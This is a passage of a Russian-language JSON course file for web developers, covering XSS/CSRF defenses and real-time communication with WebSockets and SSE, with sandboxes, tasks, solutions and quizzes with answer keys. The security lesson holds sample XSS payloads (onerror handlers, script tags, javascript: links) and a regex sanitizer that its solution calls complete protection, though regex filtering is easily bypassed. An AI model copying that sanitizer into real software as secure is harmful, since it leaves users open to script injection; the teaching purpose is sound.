        "Для санитизации HTML от пользователей ВСЕГДА используйте библиотеку DOMPurify перед вставкой в DOM.",
        "Включайте строгий заголовок `Content-Security-Policy` (CSP) — он нейтрализует 95% XSS атак, даже если в коде случайно окажется уязвимость.",
        "Добавляйте заголовок `X-Frame-Options: DENY` для защиты от атак кликджекинга (Clickjacking)."
      ],
      "commonMistakes": [
        {
          "bad": "// Хранение JWT в localStorage\nlocalStorage.setItem('auth_token', token);",
          "good": "// Установка токена бэкендом в Set-Cookie: token=...; HttpOnly; Secure; SameSite=Strict",
          "reason": "localStorage уязвим для XSS: любой внедренный скрипт может прочитать токен и отправить злоумышленнику."
        },
        {
          "bad": "// Прямая вставка HTML из параметров URL\ncontainer.innerHTML = params.get('bio');",
          "good": "container.innerHTML = DOMPurify.sanitize(params.get('bio'));",
          "reason": "Прямая вставка неэкранированного HTML позволяет выполнить произвольный вредоносный скрипт (XSS)."
        },
        {
          "bad": "// Использование SameSite=None без Secure\nSet-Cookie: token=abc; SameSite=None;",
          "good": "Set-Cookie: token=abc; SameSite=None; Secure;",
          "reason": "Браузеры блокируют куки с SameSite=None, если не указан флаг Secure (передача только по HTTPS)."
        }
      ],
      "keyTakeaways": [
        "XSS внедряет чужой скрипт в браузер жертвы; защита — `textContent`, `DOMPurify` и `CSP`.",
        "CSRF подделывает запросы от имени пользователя; защита — `SameSite` cookies и анти-CSRF токены.",
        "CSP (Content Security Policy) блокирует загрузку и выполнение недоверенных скриптов.",
        "HttpOnly флаг на куках запрещает доступ из JavaScript, защищая токены от кражи через XSS.",
        "`X-Frame-Options: DENY` защищает интерфейс от встраивания в чужие фреймы (Clickjacking)."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"sec-app\">\n  <h3>XSS Санитизатор (DOMPurify симулятор)</h3>\n  <textarea id=\"user-input\" style=\"width:100%; height:60px; background:#0d1117; color:#2dff8a; border:1px solid #30363d; font-family:monospace; padding:8px;\"><img src=x onerror=\"alert('XSS Атака!')\" /> Привет, <b>мир</b>!</textarea>\n  <div style=\"margin-top:8px; display:flex; gap:8px;\">\n    <button id=\"btn-unsafe\" style=\"background:#f85149; color:#fff; border:none; padding:6px 12px; font-weight:bold; cursor:pointer;\">Опасный innerHTML</button>\n    <button id=\"btn-safe\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:6px 12px; font-weight:bold; cursor:pointer;\">Безопасный Sanitize</button>\n  </div>\n  <div id=\"preview-area\" style=\"margin-top:12px; padding:12px; background:#161b22; border-radius:6px; min-height:40px;\"></div>\n</div>",
      "initialCss": "#sec-app { font-family: monospace; color: #e6edf3; padding: 16px; background: #0a0e13; border-radius: 8px; }",
      "initialJs": "const input = document.getElementById('user-input');\nconst preview = document.getElementById('preview-area');\n\nfunction sanitizeHtml(dirty) {\n  // Базовый симулятор удаления скриптов и опасных обработчиков onerror/onload\n  return dirty\n    .replace(/<script\\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>/gi, '')\n    .replace(/on\\w+\\s*=\\s*\"[^\"]*\"/gi, '')\n    .replace(/on\\w+\\s*=\\s*'[^']*'/gi, '');\n}\n\ndocument.getElementById('btn-unsafe').onclick = () => {\n  preview.innerHTML = input.value; // ❌ Опасно!\n};\n\ndocument.getElementById('btn-safe').onclick = () => {\n  preview.innerHTML = sanitizeHtml(input.value); // ✅ Санитизировано\n};",
      "instructions": "Практика с безопасностью:\n1. Нажмите 'Опасный innerHTML' и посмотрите, как onerror сработает в коде\n2. Нажмите 'Безопасный Sanitize' — опасный атрибут onerror будет удален, а тег <b>мир</b> останется жирным\n3. Попробуйте ввести <script>alert(1)</script>"
    },
    "task": {
      "title": "Разработка защищенного сервиса рендеринга пользовательских сообщений с санитизацией и CSRF защитой",
      "scenario": "Вам необходимо спроектировать модуль безопасного рендеринга комментариев CommentSecurityService: модуль должен санитизировать входящий HTML от опасных тегов и инлайн-обработчиков (XSS), генерировать и прикреплять X-CSRF-Token к POST-запросам и валидировать origin запросов.",
      "criteria": [
        "Функция sanitize(htmlString) нейтрализует теги <script>, <iframe> и onerror/onclick обработчики",
        "Метод postComment(url, data, csrfToken) отправляет данные с заголовком X-CSRF-Token",
        "Реализована защита от протокола javascript: в ссылках href",
        "Использовано безопасное экранирование спецсимволов HTML"
      ],
      "starterCode": {
        "js": "// Реализуйте сервис безопасности CommentSecurityService\nclass CommentSecurityService {\n  // Ваш код\n}"
      },
      "hints": [
        "Используйте регулярные выражения или DOMParser для очистки от <script> и on\\w+",
        "Заменяйте javascript: на # в ссылках href",
        "В fetch передавайте headers: { 'X-CSRF-Token': csrfToken }"
      ],
      "solution": {
        "js": "class CommentSecurityService {\n  static sanitize(dirtyHtml) {\n    if (typeof dirtyHtml !== 'string') return '';\n    \n    // 1. Очистка от тегов script, iframe, object, embed\n    let clean = dirtyHtml.replace(/<(script|iframe|object|embed)\\b[^<]*(?:(?!<\\/\\1>)<[^<]*)*<\\/\\1>/gi, '');\n    \n    // 2. Удаление инлайн-обработчиков событий on* (onerror, onclick, onload и т.д.)\n    clean = clean.replace(/\\s+on\\w+\\s*=\\s*(\"[^\"]*\"|'[^']*'|[^\\s>]+)/gi, '');\n    \n    // 3. Нейтрализация опасных ссылок javascript:\n    clean = clean.replace(/href\\s*=\\s*(\"javascript:[^\"]*\"|'javascript:[^']*')/gi, 'href=\"#\"');\n    \n    return clean;\n  }\n\n  static async postComment(url, payload, csrfToken) {\n    if (!csrfToken) {\n      throw new Error('CSRF Token is required for POST requests');\n    }\n\n    const response = await fetch(url, {\n      method: 'POST',\n      headers: {\n        'Content-Type': 'application/json',\n        'X-CSRF-Token': csrfToken\n      },\n      body: JSON.stringify(payload)\n    });\n\n    return response.json();\n  }\n}\n\n// Тест работы\nconst dirty = '<p>Привет <script>steal()</script><img src=\"x\" onerror=\"hack()\" /><a href=\"javascript:evil()\">Клик</a></p>';\nconst clean = CommentSecurityService.sanitize(dirty);\nconsole.log(clean);\n// '<p>Привет <img src=\"x\" /><a href=\"#\">Клик</a></p>'",
        "explanation": "Сервис полностью нейтрализует XSS векторы (скрипты, onerror, javascript: ссылки) и гарантирует передачу CSRF-токена в заголовках POST-запросов."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro10-q1",
          "question": "Злоумышленник размещает на своём сайте форму, которая отправляет запрос на перевод денег в банк жертвы, рассчитывая на её активную сессию. Что это за атака?",
          "options": [
            "Межсайтовый скриптинг: на странице банка исполняется внедрённый чужой код",
            "Кликджекинг: интерфейс банка встраивается в невидимый фрейм поверх страницы",
            "Перехват посредником: трафик читается между клиентом и сервером банка",
            "Подделка межсайтового запроса: используется уже имеющаяся авторизация жертвы"
          ],
          "correctIndex": 3,
          "explanation": "Ключевой признак: чужой код никуда не внедряется и данные жертвы не читаются — атакующий вообще не видит ответ. Он лишь заставляет браузер отправить запрос, а браузер послушно прикладывает куки сессии, и сервер считает запрос законным. Защита строится на том, чтобы отличить «свой» запрос от чужого: признак `SameSite` у куки и отдельный токен, который сторонний сайт знать не может."
        },
        {
          "id": "pro10-q2",
          "question": "Токен сессии лежит в куке с признаком `HttpOnly`. Полностью ли это защищает от последствий межсайтового скриптинга?",
          "options": [
            "Да: внедрённый скрипт ничего не сможет сделать без доступа к самому токену",
            "Нет, поскольку этот признак действует только на куки, выставленные сервером",
            "Да, при условии что дополнительно выставлен признак `Secure` на этой куке",
            "Нет: скрипт не прочитает токен, но сможет слать запросы от имени пользователя"
          ],
          "correctIndex": 3,
          "explanation": "Признак решает ровно одну задачу: токен нельзя вынести наружу и использовать потом. Но внедрённый скрипт выполняется на вашем домене, и любой отправленный им запрос браузер снабдит той же кукой автоматически — деньги переведутся, пароль сменится, данные утекут. Поэтому такая кука лишь снижает ущерб, а бороться нужно с самой причиной: экранированием вывода и политикой безопасности содержимого."
        },
        {
          "id": "pro10-q3",
          "question": "Какие из этих способов вывода пользовательского комментария безопасны?",
          "codeSnippet": "comment.innerHTML = userText;                      // (1)\ncomment.textContent = userText;                    // (2)\ncomment.innerHTML = DOMPurify.sanitize(userText);  // (3)",
          "options": [
            "Только первый: браузер сам экранирует опасные конструкции в присваиваемой строке",
            "Второй и третий: один выводит строку как текст, другой очищает разметку от опасного",
            "Только второй: любую разметку, пришедшую от пользователя, выводить недопустимо",
            "Все три: современные браузеры блокируют выполнение встроенных скриптов"
          ],
          "correctIndex": 1,
          "explanation": "Присваивание разметки напрямую — прямой путь к внедрению кода: достаточно картинки с обработчиком ошибки, никакого тега скрипта не требуется. Вывод текстом безопасен всегда, потому что строка так и остаётся строкой. Если разметка действительно нужна, например форматирование из редактора, её прогоняют через проверенную библиотеку очистки, которая вырезает опасные теги и атрибуты."
        },
        {
          "id": "pro10-q4",
          "question": "Что делает политика безопасности содержимого и почему её называют второй линией обороны?",
          "options": [
            "Шифрует передаваемые данные, дублируя защиту на транспортном уровне соединения",
            "Проверяет вводимые данные на сервере до того, как они попадут в базу данных",
            "Задаёт список доверенных источников и блокирует чужой код, даже если уязвимость есть",
            "Запрещает встраивание вашей страницы во фреймы на сторонних сайтах"
          ],
          "correctIndex": 2,
          "explanation": "Заголовок перечисляет, откуда странице разрешено грузить скрипты, стили, картинки и шрифты, и запрещает выполнение встроенного кода. Даже если в приложение просочится внедрение, браузер откажется исполнять скрипт с чужого домена или из тела страницы — атака гасится на уровне платформы. Первой линией остаются экранирование и очистка ввода, а от встраивания во фреймы защищает отдельный заголовок."
        },
        {
          "id": "pro10-q5",
          "question": "Какое значение признака `SameSite` не отправит куку даже при обычном переходе по ссылке с чужого сайта?",
          "options": [
            "`Lax` — при этом значении кука не уходит ни при каких межсайтовых запросах",
            "Отсутствие признака — в этом случае по умолчанию действует полный запрет",
            "`None` — это значение ограничивает куку собственным источником по умолчанию",
            "`Strict` — кука прикладывается только к запросам, инициированным вашим же сайтом"
          ],
          "correctIndex": 3,
          "explanation": "Самое строгое значение не отправляет куку ни в каком межсайтовом контексте, включая переход по обычной ссылке, — поэтому пользователь, пришедший из письма, окажется разлогиненным. Промежуточное значение разрешает куку при переходах верхнего уровня, но блокирует её в фоновых запросах и отправках форм, закрывая подделку запросов; именно оно действует по умолчанию. Полное снятие ограничения требует передачи только по защищённому соединению."
        }
      ]
    }
  },
  {
    "id": "pro-11",
    "moduleId": "pro",
    "level": 11,
    "title": "Реалтайм-коммуникация: WebSockets, Server-Sent Events (SSE) и Polling",
    "subtitle": "Short/Long Polling, SSE EventSource, WebSockets (wss://), Heartbeat, Reconnection и архитектура онлайн-чата",
    "description": "Освойте разработку приложений реального времени (Real-Time Web): архитектурное сравнение Polling vs Server-Sent Events (SSE) vs WebSockets, подключение по протоколу wss://, обработку разрывов связи (Heartbeat / Ping-Pong), алгоритм Exponential Backoff переподключения и реализацию отказоустойчивого клиента.",
    "estimatedMinutes": 65,
    "difficulty": "intermediate",
    "tags": [
      "websockets",
      "sse",
      "polling",
      "realtime",
      "event-source",
      "heartbeat",
      "reconnection",
      "chat"
    ],
    "theory": {
      "overview": "Традиционная модель веба построена на однократных HTTP-запросах (Pull Model): клиент запрашивает данные — сервер отвечает и разрывает соединение. Однако современные сервисы (онлайн-чаты, биржевые дашборды, стриминг ответов нейросетей ChatGPT, совместная работа в Figma/Google Docs) требуют мгновенной доставки данных без задержек (Push Model).\n\nВ этом уроке мы разберём эволюцию технологий реального времени: от ресурсоемкого Polling до однонаправленного **Server-Sent Events (SSE)** и полнодуплексного **WebSockets (`wss://`)**, настроим надежное переподключение с Exponential Backoff и механизм контроля активности Heartbeat.",
      "sections": [
        {
          "title": "Эволюция реалтайма: Polling vs Server-Sent Events (SSE) vs WebSockets",
          "content": "Сравнение 3 подходов к получению данных в реальном времени:\n\n1. **Short Polling (Короткий опрос)**:\n- Клиент шлет обычный GET-запрос каждые 2–5 секунд через `setInterval`.\n- Минусы: 95% запросов возвращают пустые ответы, огромный оверхед HTTP-заголовков (1–2 КБ на каждый запрос), колоссальная нагрузка на сервер и базу данных!\n\n2. **Server-Sent Events (SSE / `EventSource`)**:\n- **Однонаправленный Push-поток** от сервера к клиенту поверх стандартного HTTP/2.\n- Плюсы: встроенное автоматическое переподключение, поддержка событий по именам (`event: message`), работает через стандартные HTTPS порты и прокси.\n- Идеален для: **стриминга ответов LLM (ChatGPT / Claude)**, биржевых котировок, лент уведомлений.\n\n3. **WebSockets (`ws://` и защищенный `wss://`)**:\n- **Полнодуплексный (Full-Duplex) двунаправленный протокол** поверх одного постоянного TCP-соединения.\n- Клиент и сервер могут слать сообщения в ЛЮБОЙ момент одновременно с минимальным оверхедом (всего 2–10 байт на фрейм!).\n- Идеален для: онлайн-чатов, мультиплеерных игр, совместного редактирования (Figma) и трейдинга.",
          "image": {
            "src": "/images/lessons/web-realtime-websockets.svg",
            "alt": "Реалтайм веб-коммуникация: Polling, Server-Sent Events (SSE) и WebSockets",
            "caption": "Polling шлет повторные GET-запросы, SSE обеспечивает однонаправленный push со стороны сервера (LLM стриминг), WebSockets — полнодуплексную связь для чатов"
          },
          "codeExample": {
            "language": "javascript",
            "code": "// 1. Server-Sent Events (SSE) клиент: идеален для стриминга текста нейросети\nconst eventSource = new EventSource('/api/ai/stream?prompt=React');\n\neventSource.onmessage = (event) => {\n  const chunk = JSON.parse(event.data);\n  aiOutputDiv.textContent += chunk.token;\n};\n\neventSource.onerror = (err) => {\n  console.error('SSE Ошибка/Завершение:', err);\n  eventSource.close(); // Закрываем по завершении\n};",
            "title": "Клиент Server-Sent Events (SSE) для стриминга ответов",
            "explanation": "EventSource держит одно постоянное HTTP-соединение, получая чанки текста от сервера по мере их генерации."
          }
        },
        {
          "title": "Протокол WebSockets: Рукопожатие (Handshake) и WebSocket API",
          "content": "Как устанавливается и работает WebSocket-соединение:\n\n1. **HTTP Upgrade Handshake (Рукопожатие)**:\n- Клиент отправляет стандартный HTTP-запрос с заголовками:\n  `Upgrade: websocket`\n  `Connection: Upgrade`\n  `Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==`\n- Сервер отвечает статус-кодом **`101 Switching Protocols`**.\n- Протокол переключается с HTTP на постоянный бинарный сокет WebSocket (`wss://`).\n\n2. Браузерный **`WebSocket API`**:\n- `const socket = new WebSocket('wss://chat.intern.dev/ws');`\n- Событие `open` — соединение успешно установлено.\n- Событие `message` (`event.data`) — получено новое сообщение от сервера (текст JSON или бинарный `Blob/ArrayBuffer`).\n- Событие `error` — ошибка связи.\n- Событие `close` (`event.code`, `event.reason`) — соединение закрыто.\n- Метод `socket.send(JSON.stringify(payload))` — отправка данных на сервер.",
          "codeExample": {
            "language": "javascript",
            "code": "// Базовый WebSocket клиент\nconst socket = new WebSocket('wss://api.intern.dev/chat');\n\nsocket.addEventListener('open', () => {\n  console.log('✅ WebSocket соединение установлено!');\n  // Отправка сообщения авторизации\n  socket.send(JSON.stringify({ type: 'AUTH', token: 'jwt_token_here' }));\n});\n\nsocket.addEventListener('message', (event) => {\n  const message = JSON.parse(event.data);\n  console.log('📩 Новое сообщение:', message);\n  displayChatMessage(message);\n});\n\nsocket.addEventListener('close', (event) => {\n  console.log(`🔌 Соединение закрыто. Код: ${event.code}, Причина: ${event.reason}`);\n});",
            "title": "Инициализация и обработка событий WebSocket в браузере",
            "explanation": "WebSocket API предоставляет события open, message, close и error для двусторонней связи с сервером без лишних HTTP-заголовков."
          }
        },
        {
          "title": "Надежность в Production: Heartbeat (Ping/Pong) и Exponential Backoff",
          "content": "Подводные камни WebSockets в реальном продакшне и их решение:\n\n1. **Проблема «Зомби-соединений» (Silent Drop)**:\nWi-Fi отключился или мобильный интернет переключил вышку, но браузер не получил событие `close` (сокет «завис» в полуоткрытом состоянии).\n✅ Решение — **Heartbeat (Пинг-Понг)**:\nКлиент каждые 30 секунд шлет серверу сообщение `{ type: 'PING' }` и ждет `{ type: 'PONG' }` в течение 5 секунд. Если ответ не пришел — принудительно разрывает сокет `socket.close()` и запускает реконнект!\n\n2. **Exponential Backoff Reconnection (Умный реконнект)**:\nЕсли сервер упал на перезагрузку, 10 000 клиентов не должны одновременно долбить сервер каждую миллисекунду (лавинный эффект Thundering Herd).\n✅ Задержка между попытками растет экспоненциально с добавлением случайного шума (Jitter):\n1-я попытка: 1 сек, 2-я: 2 сек, 3-я: 4 сек, 4-я: 8 сек, максимум: 30 сек.",
          "codeExample": {
            "language": "javascript",
            "code": "// Алгоритм Exponential Backoff с Jitter\nfunction getReconnectDelay(attempt, baseDelay = 1000, maxDelay = 30000) {\n  // Экспоненциальный рост: 1000 * 2^attempt\n  const exponential = Math.min(maxDelay, baseDelay * Math.pow(2, attempt));\n  // Добавление случайного разброса (Jitter) ±20% для предотвращения одновременных запросов\n  const jitter = exponential * (0.8 + Math.random() * 0.4);\n  return Math.round(jitter);\n}\n\nconsole.log('Попытка 0:', getReconnectDelay(0)); // ~1000 мс\nconsole.log('Попытка 1:', getReconnectDelay(1)); // ~2000 мс\nconsole.log('Попытка 2:', getReconnectDelay(2)); // ~4000 мс\nconsole.log('Попытка 3:', getReconnectDelay(3)); // ~8000 мс",
            "title": "Вычисление задержки Exponential Backoff с Jitter для реконнекта",
            "explanation": "Экспоненциальная задержка со случайным разбросом защищает бэкенд от лавинной перегрузки при массовом реконнекте клиентов."
          }
        },
        {
          "title": "Архитектура устойчивого WebSocket-клиента в SPA",
          "content": "Паттерн надежного WebSocket менеджера в Single Page Application:\n\n1. **Очередь неотправленных сообщений (Offline Message Queue)**:\nЕсли пользователь отправляет сообщение во время кратковременного обрыва связи, клиент не теряет данные, а сохраняет их в массив `offlineQueue` и отправляет пачкой сразу после восстановления события `open`.\n\n2. **Управление подписками через PubSub**:\nКомпоненты чата подписываются на конкретные типы событий (`ws.on('NEW_MESSAGE', fn)`), а при размонтировании экрана отписываются, предотвращая утечки памяти.\n\n3. **Масштабирование на бэкенде**:\nКогда у вас 10 серверов приложений, WebSocket-клиенты подключены к разным инстансам. Серверы синхронизируют сообщения между собой через брокер сообщений **Redis Pub/Sub** или RabbitMQ.",
          "codeExample": {
            "language": "javascript",
            "code": "// Архитектурный каркас надежного WebSocket клиента\nexport class ResilientWebSocket {\n  constructor(url) {\n    this.url = url;\n    this.socket = null;\n    this.queue = [];\n    this.attempt = 0;\n    this.connect();\n  }\n\n  connect() {\n    this.socket = new WebSocket(this.url);\n    this.socket.onopen = () => {\n      this.attempt = 0;\n      // Отправка сообщений, накопившихся во время офлайна\n      while (this.queue.length > 0) {\n        this.socket.send(this.queue.shift());\n      }\n    };\n    this.socket.onclose = () => this.scheduleReconnect();\n  }\n\n  send(data) {\n    const payload = JSON.stringify(data);\n    if (this.socket?.readyState === WebSocket.OPEN) {\n      this.socket.send(payload);\n    } else {\n      this.queue.push(payload); // Сохраняем в очередь\n    }\n  }\n\n  scheduleReconnect() {\n    const delay = Math.min(30000, 1000 * Math.pow(2, this.attempt++));\n    setTimeout(() => this.connect(), delay);\n  }\n}",
            "title": "Отказоустойчивый WebSocket клиент с очередью сообщений",
            "explanation": "Клиент буферизует сообщения при обрыве сети и автоматически восстанавливает связь по алгоритму Exponential Backoff."
          }
        }
      ],
      "seniorTips": [
        "Используйте Server-Sent Events (SSE) для стриминга ответов ИИ-нейросетей (ChatGPT LLM) — SSE проще в реализации, работает поверх HTTP/2 и имеет нативный реконнект.",
        "Для WebSockets ВСЕГДА реализуйте механизм Heartbeat (Ping/Pong каждые 30с) — без него мобильные сети незаметно 'усыпляют' TCP-сокеты без вызова события onclose.",
        "При реконнекте ВСЕГДА применяйте Exponential Backoff со случайным шумом (Jitter), чтобы не положить сервер лавиной одновременных запросов.",
        "Буферизуйте неотправленные сообщения пользователя в очередь Offline Queue во время кратковременных обрывов связи."
      ],
      "commonMistakes": [
        {
          "bad": "// Мгновенный бесконечный реконнект без задержки\nsocket.onclose = () => socket = new WebSocket(url);",
          "good": "socket.onclose = () => setTimeout(() => connect(), getExponentialDelay());",
          "reason": "При падении сервера мгновенный бесконечный реконнект создаст тысячи запросов в секунду (DDoS собственного сервера)."
        },
        {
          "bad": "// Использование WebSockets для простых одноразовых уведомлений\n// Поднятие тяжелого WS-сервера ради редкого уведомления раз в день",
          "good": "// Использование SSE или Web Push Notifications",
          "reason": "WebSockets требуют постоянного TCP соединения и расходуют ресурсы сервера. Для редких пушей лучше подходят SSE или Web Push."
        },
        {
          "bad": "// Отправка данных без проверки readyState\nsocket.send(data); // ❌ InvalidStateError: WebSocket is already in CLOSING or CLOSED state",
          "good": "if (socket.readyState === WebSocket.OPEN) { socket.send(data); } else { queue.push(data); }",
          "reason": "Вызов send на закрытом или подключающемся сокете выбрасывает фатальное исключение."
        }
      ],
      "keyTakeaways": [
        "Polling — частые GET-запросы с большим оверхедом, SSE — однонаправленный push для AI-стриминга, WebSockets — полнодуплексный двусторонний сокет.",
        "WebSockets стартуют с HTTP Upgrade запроса и переключаются на постоянное TCP-соединение (101 Switching Protocols).",
        "Heartbeat (Ping/Pong) выявляет 'зомби-соединения' при обрыве сети на смартфонах.",
        "Exponential Backoff с Jitter защищает инфраструктуру от перегрузки при массовом переподключении.",
        "Очередь Offline Queue гарантирует доставку сообщений, отправленных во время обрыва связи."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"ws-app\">\n  <h3>Симулятор WebSockets (Онлайн-чат)</h3>\n  <div id=\"chat-window\" style=\"height:120px; overflow-y:auto; background:#0d1117; border:1px solid #30363d; border-radius:6px; padding:8px; font-size:12px; margin-bottom:8px;\">\n    <div style=\"color:#8b949e;\">🔌 Соединение установлено: wss://chat.intern.dev</div>\n  </div>\n  <div style=\"display:flex; gap:8px;\">\n    <input id=\"msg-input\" placeholder=\"Введите сообщение...\" style=\"flex:1; padding:6px; background:#0d1117; color:#2dff8a; border:1px solid #30363d; font-family:monospace;\" />\n    <button id=\"send-btn\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:6px 14px; font-weight:bold; cursor:pointer;\">Отправить</button>\n  </div>\n</div>",
      "initialCss": "#ws-app { font-family: monospace; color: #e6edf3; padding: 16px; background: #0a0e13; border-radius: 8px; }",
      "initialJs": "const chat = document.getElementById('chat-window');\nconst input = document.getElementById('msg-input');\n\nfunction addMsg(author, text, isSelf) {\n  const row = document.createElement('div');\n  row.style.color = isSelf ? '#2dff8a' : '#29e7ff';\n  row.style.marginTop = '4px';\n  row.textContent = `[${author}]: ${text}`;\n  chat.appendChild(row);\n  chat.scrollTop = chat.scrollHeight;\n}\n\ndocument.getElementById('send-btn').onclick = () => {\n  if (!input.value.trim()) return;\n  addMsg('Вы', input.value, true);\n  const text = input.value;\n  input.value = '';\n  \n  // Симуляция ответа сервера через сокет\n  setTimeout(() => {\n    addMsg('Сервер', `Эхо: «${text}» получено в ${new Date().toLocaleTimeString()}`, false);\n  }, 600);\n};",
      "instructions": "Практика с WebSockets:\n1. Отправьте сообщение в чат и получите мгновенный эхо-ответ от сокета\n2. Реализуйте симуляцию PING/PONG сообщений каждые 5 секунд\n3. Добавьте проверку статуса соединения (Online / Reconnecting)"
    },
    "task": {
      "title": "Разработка отказоустойчивого WebSocket менеджера с Heartbeat и Exponential Backoff",
      "scenario": "Вам необходимо разработать production-ready класс RealtimeClient: клиент должен устанавливать соединение по протоколу WebSocket, слать Heartbeat PING каждые 10 секунд, переподключаться по алгоритму Exponential Backoff при обрыве связи и сохранять сообщения в очередь offlineQueue при отсутствии сети.",
      "criteria": [
        "Класс RealtimeClient инкапсулирует подключение к WebSocket",
        "Реализован Heartbeat таймер (отправка PING каждые 10 секунд)",
        "Реализован алгоритм Exponential Backoff для переподключения при закрытии сокета",
        "Метод send() сохраняет сообщения в очередь, если сокет не в состоянии OPEN",
        "Очередь сообщений автоматически сбрасывается на сервер при открытии сокета onopen"
      ],
      "starterCode": {
        "js": "// Реализуйте класс RealtimeClient\nclass RealtimeClient {\n  constructor(url) {\n    // Ваш код\n  }\n}"
      },
      "hints": [
        "Используйте this.socket.readyState === WebSocket.OPEN",
        "Для задержки: Math.min(30000, 1000 * Math.pow(2, this.retryCount))",
        "Таймер Heartbeat: this.heartbeatTimer = setInterval(() => this.send({ type: 'PING' }), 10000)"
      ],
      "solution": {
        "js": "class RealtimeClient {\n  constructor(url) {\n    this.url = url;\n    this.socket = null;\n    this.queue = [];\n    this.retryCount = 0;\n    this.heartbeatTimer = null;\n    this.listeners = new Map();\n    this.connect();\n  }\n\n  connect() {\n    this.socket = new WebSocket(this.url);\n\n    this.socket.onopen = () => {\n      console.log('WebSocket сокет открыт');\n      this.retryCount = 0;\n      this.startHeartbeat();\n\n      // Сброс очереди сообщений\n      while (this.queue.length > 0) {\n        this.socket.send(this.queue.shift());\n      }\n    };\n\n    this.socket.onmessage = (event) => {\n      try {\n        const data = JSON.parse(event.data);\n        if (data.type === 'PONG') return; // Игнорируем Heartbeat ответ\n        const handler = this.listeners.get(data.type);\n        if (handler) handler(data);\n      } catch (err) {\n        console.error('Ошибка парсинга WS сообщения:', err);\n      }\n    };\n\n    this.socket.onclose = () => {\n      this.stopHeartbeat();\n      this.scheduleReconnect();\n    };\n  }\n\n  send(payload) {\n    const str = JSON.stringify(payload);\n    if (this.socket && this.socket.readyState === WebSocket.OPEN) {\n      this.socket.send(str);\n    } else {\n      this.queue.push(str);\n    }\n  }\n\n  on(eventType, callback) {\n    this.listeners.set(eventType, callback);\n  }\n\n  startHeartbeat() {\n    this.stopHeartbeat();\n    this.heartbeatTimer = setInterval(() => {\n      this.send({ type: 'PING' });\n    }, 10000);\n  }\n\n  stopHeartbeat() {\n    if (this.heartbeatTimer) {\n      clearInterval(this.heartbeatTimer);\n      this.heartbeatTimer = null;\n    }\n  }\n\n  scheduleReconnect() {\n    const delay = Math.min(30000, 1000 * Math.pow(2, this.retryCount++));\n    console.log(`Реконнект через ${delay} мс...`);\n    setTimeout(() => this.connect(), delay);\n  }\n}",
        "explanation": "RealtimeClient реализует промышленный стандарт: управление очередью в офлайне, автоматический Heartbeat (PING/PONG каждые 10с), экспоненциальный реконнект и диспетчеризацию сообщений по типам."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro11-q1",
          "question": "Сервер стримит ответ нейросети по мере генерации токенов, клиент при этом ничего не отправляет. Какую технологию выбрать?",
          "options": [
            "Server-Sent Events — однонаправленный поток поверх HTTP с автоматическим переподключением",
            "WebSocket — только он способен передавать данные по мере их готовности",
            "Частый опрос сервера каждые сто миллисекунд — такой вариант проще в реализации",
            "Долгий опрос: соединение держится открытым до появления новых данных"
          ],
          "correctIndex": 0,
          "explanation": "Поток данных здесь строго односторонний, и полнодуплексный сокет со своим рукопожатием, собственным протоколом сообщений и ручным переподключением оказывается лишней сложностью. Этот механизм работает поверх обычного HTTP, а значит наследует сжатие, авторизацию и мультиплексирование, а переподключение браузер берёт на себя. Опрос же создаёт лавину запросов и заметную задержку."
        },
        {
          "id": "pro11-q2",
          "question": "Каким статусом сервер подтверждает переход соединения на протокол WebSocket?",
          "options": [
            "`200 OK` — обычное успешное завершение обмена запросом и ответом",
            "`101 Switching Protocols` — соединение переключается на другой протокол",
            "`204 No Content` — тело отсутствует, а соединение остаётся открытым",
            "`426 Upgrade Required` — клиент обязан повторить запрос с обновлением"
          ],
          "correctIndex": 1,
          "explanation": "Соединение начинается как обычный HTTP-запрос с заголовком запроса обновления протокола и ключом. Сервер отвечает статусом из группы информационных, подтверждая переключение, после чего то же TCP-соединение перестаёт быть HTTP и превращается в двусторонний канал кадров. Статус с требованием обновления сервер шлёт в обратной ситуации — когда клиент пришёл по старому протоколу."
        },
        {
          "id": "pro11-q3",
          "question": "Сокет на мобильной сети перестал получать сообщения, но событие закрытия так и не пришло. Что это и как такое обнаружить?",
          "options": [
            "Переполнение буфера: сообщения копятся, выявляется проверкой размера исходящей очереди",
            "Соединение-зомби: обрыв не дошёл до клиента, выявляется периодическим обменом сигналами",
            "Блокировка прокси: определяется по коду ошибки в обработчике события ошибки",
            "Ограничение частоты: сервер молча отбрасывает сообщения сверх заданного лимита"
          ],
          "correctIndex": 1,
          "explanation": "При смене вышки, переходе в спящий режим или разрыве через промежуточный прокси клиент часто не получает никакого уведомления: сокет выглядит открытым, но данные через него уже не ходят. Единственный способ убедиться в живости канала — регулярно обмениваться короткими служебными сообщениями и считать соединение мёртвым, если ответ не пришёл за отведённое время. Тогда клиент закрывает сокет сам и запускает переподключение."
        },
        {
          "id": "pro11-q4",
          "question": "Сервер упал, и десять тысяч клиентов одновременно пытаются переподключиться. Что добавить помимо растущей задержки между попытками?",
          "options": [
            "Ограничение числа попыток десятью, после чего показывать сообщение об ошибке",
            "Кеширование последнего состояния, чтобы не запрашивать одни и те же данные повторно",
            "Переключение на опрос сервера обычными запросами вместо постоянного соединения",
            "Случайный разброс задержки, иначе клиенты будут ломиться синхронными волнами"
          ],
          "correctIndex": 3,
          "explanation": "Все клиенты потеряли связь в один момент, поэтому одинаковая формула задержки выстраивает их в синхронные волны: через секунду, через две, через четыре — и каждая волна добивает поднимающийся сервер. Небольшой случайный сдвиг размазывает попытки по времени и позволяет сервису встать. Ограничение числа попыток полезно, но саму лавину не устраняет."
        },
        {
          "id": "pro11-q5",
          "question": "Что произойдёт при выполнении этого кода сразу после создания сокета?",
          "codeSnippet": "const ws = new WebSocket(url);\nws.send(JSON.stringify({ type: 'hello' }));",
          "options": [
            "Сообщение встанет в очередь и уйдёт сразу после установки соединения",
            "Будет выброшено исключение: сокет ещё находится в состоянии подключения",
            "Сообщение отправится: конструктор устанавливает соединение синхронно",
            "Соединение закроется с ошибкой, и сработает обработчик события закрытия"
          ],
          "correctIndex": 1,
